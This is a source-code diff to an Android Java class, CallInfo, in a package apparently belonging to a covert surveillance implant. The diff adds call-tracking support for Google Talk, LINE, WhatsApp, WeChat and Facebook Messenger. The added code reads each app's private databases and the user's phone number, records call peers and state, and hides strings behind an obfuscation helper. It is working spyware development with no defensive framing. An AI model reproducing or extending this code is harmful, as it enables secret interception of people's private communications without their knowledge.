@@ -2,15 +2,28 @@ package com.android.dvci.module.call;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.db.GenericSqliteHelper;
+import com.android.dvci.module.chat.ChatFacebook;
+import com.android.dvci.module.chat.ChatGoogle;
+import com.android.dvci.module.chat.ChatLine;
 import com.android.dvci.module.chat.ChatSkype;
 import com.android.dvci.module.chat.ChatViber;
+import com.android.dvci.module.chat.ChatWeChat;
+import com.android.dvci.module.chat.ChatWhatsapp;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.StringUtils;
 import com.android.mm.M;
 
 import java.util.Date;
 
 public class CallInfo {
 	private static final String TAG = "CallInfo";
+	public static final int PRG_SKYPE_ID = 0x0146;
+	public static final int PRG_GTALK_ID = 0x0142;
+	public static final int PRG_LINE_ID = 0x014a;
+	public static final int PRG_VIBER_ID = 0x0148;
+	public static final int PRG_WHATSAPP_ID = 0x014b;
+	public static final int PRG_WECHAT_ID = 0x0149;
+	public static final int PRG_FB_ID = 0x014c;
 
 	public int id;
 	public String account;
@@ -117,7 +130,7 @@ public class CallInfo {
 			this.programId = 0x0148;
 		}
 
-		if (this.programId == 0x0146) {
+		if (this.programId == PRG_SKYPE_ID) {
 
 			if (end) {
 				return true;
@@ -136,6 +149,7 @@ public class CallInfo {
 				}
 			}
 			boolean ret = false;
+			// todo: togliere l'helper, includerlo in ChatSkype.getAccount
 			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
 
 			if (helper != null) {
@@ -148,7 +162,60 @@ public class CallInfo {
 
 			return ret;
 
-		} else if (this.programId == 0x0148) {
+		} else if (this.programId == PRG_GTALK_ID) {
+
+			boolean ret = false;
+			this.processName = M.e("com.google.android.talk");
+			this.delay = true;
+			this.realRate = true;
+
+			// open DB
+			if (end) {
+				ret = ChatGoogle.getCurrentCall(this);
+
+			} else {
+				this.account = M.e("delay");
+				this.peer = M.e("delay");
+				ret = true;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " gtalk (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+			}
+			return ret;
+
+		} else if (this.programId == PRG_LINE_ID) {
+			boolean ret = false;
+			this.processName = M.e("jp.naver.line.android");
+			this.delay = true;
+			this.realRate = true;
+
+			// open DB
+			if (end) {
+
+				String account = ChatLine.getAccount();
+				if(account.equals("") ){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (updateCallInfo) failed to get account for line ");
+					}
+				}
+				this.account = account;
+
+				ret = ChatLine.getCurrentCall(this);
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (updateCallInfo) id: " + this.id);
+				}
+			} else {
+				this.account = M.e("delay");
+				this.peer = M.e("delay");
+				ret = true;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " LINE (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+			}
+			return ret;
+
+		} else if (this.programId == PRG_VIBER_ID) {
 			boolean ret = false;
 			this.processName = M.e("com.viber.voip");
 			this.delay = true;
@@ -179,6 +246,93 @@ public class CallInfo {
 
 			return ret;
 
+		} else if (this.programId == PRG_WHATSAPP_ID) {
+			if (end) {
+				return true;
+			}
+			this.processName = M.e("com.whatsapp");
+			// open DB
+			String account = ChatWhatsapp.readMyPhoneNumber();
+			this.account = account;
+			this.delay = false;
+			this.realRate = true;
+
+			if(account == null){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (update) ERROR, cannot read whatsapp account ");
+					return false;
+				}
+			}
+			boolean ret = false;
+				ret = ChatWhatsapp.getCurrentCall(this);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " WHATSAPP (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+				}
+
+			return ret;
+		}else if (this.programId == PRG_WECHAT_ID) {
+			if (end) {
+				return true;
+			}
+			this.processName = M.e("com.tencent.mm");
+			// open DB
+			String account = ChatWeChat.readMyPhoneNumber();
+			this.account = account;
+			this.delay = false;
+			this.realRate = true;
+
+			if(account == null){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (update) ERROR, cannot read wechat account ");
+					return false;
+				}
+			}
+			boolean ret = false;
+			ret = ChatWeChat.getCurrentCall(this);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " WECHAT (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+			}
+
+			return ret;
+		}else if (this.programId == PRG_FB_ID) {
+
+			boolean ret = false;
+			this.processName = M.e("com.facebook.orca");
+			this.delay = true;
+			this.realRate = true;
+			if (end) {
+
+				// open DB
+
+				String account = ChatFacebook.getPhone_number();
+				if (StringUtils.isEmpty(account)) {
+					ChatFacebook.getAccountInfo();
+					account = ChatFacebook.getPhone_number();
+					if (StringUtils.isEmpty(account)) {
+						account = "fb local";
+					}
+				}
+				this.account = account;
+				if (account == null) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (update) ERROR, cannot read whatsapp account ");
+						return false;
+					}
+				}
+
+				ret = ChatFacebook.getCurrentCall(this);
+
+
+			} else {
+				this.account = M.e("delay");
+				this.peer = M.e("delay");
+				ret = true;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " FACEBOOK (updateCallInfo): id: " + this.id + " peer: " + this.peer + " incoming=" + this.incoming + " returning:" + ret);
+			}
+
+			return ret;
 		}
 		return false;
 	}
